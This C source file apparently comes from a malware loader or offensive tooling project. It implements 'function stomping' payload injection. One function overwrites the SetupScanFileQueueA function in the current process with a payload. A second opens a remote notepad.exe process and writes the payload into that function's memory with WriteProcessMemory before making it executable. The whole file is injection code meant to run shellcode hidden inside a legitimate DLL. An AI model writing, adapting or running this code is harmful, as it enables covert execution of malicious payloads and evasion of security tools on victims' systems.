#include "payload_loading.h"
#include <setupapi.h>

#pragma comment (lib, "Setupapi.lib") // adding "setupapi.dll" to the import address table


BOOL WritePayloadViaFunctionStomping(OUT PVOID *pAddress, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {
    *pAddress = &SetupScanFileQueueA;
	DWORD	dwOldProtection = NULL;


	if (!VirtualProtect(*pAddress, sPayloadSize, PAGE_READWRITE, &dwOldProtection)) {
		DebugPrint("[!] VirtualProtect [RW] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	memcpy(*pAddress, pPayload, sPayloadSize);

	if (!VirtualProtect(*pAddress, sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtection)) {
		DebugPrint("[!] VirtualProtect [RWX] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

BOOL WritePayloadViaRemoteFunctionStomping(OUT PVOID *pAddress, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {
	HANDLE		hProcess	= NULL;
    DWORD	dwOldProtection = NULL;
	DWORD		dwProcessId = NULL;
	SIZE_T	sNumberOfBytesWritten = NULL;

	DebugPrint("[i] Function stomping into remote process notepad.exe\n");

	if (!GetRemoteProcessHandle(L"notepad.exe", &dwProcessId, &hProcess)) {
		DebugPrint("[!] Process is Not Found \n");
		return FALSE;
	}
	DebugPrint("[i] Found Target Process Pid: %d \n", dwProcessId);

	*pAddress = &SetupScanFileQueueA;

	if (!VirtualProtectEx(hProcess, pAddress, sPayloadSize, PAGE_READWRITE, &dwOldProtection)) {
		DebugPrint("[!] VirtualProtectEx [RW] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	if (!WriteProcessMemory(hProcess, pAddress, pPayload, sPayloadSize, &sNumberOfBytesWritten) || sPayloadSize != sNumberOfBytesWritten) {
		DebugPrint("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		DebugPrint("[!] Bytes Written : %d of %d \n", sNumberOfBytesWritten, sPayloadSize);
		return FALSE;
	}

	if (!VirtualProtectEx(hProcess, pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		DebugPrint("[!] VirtualProtectEx [RWX] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}
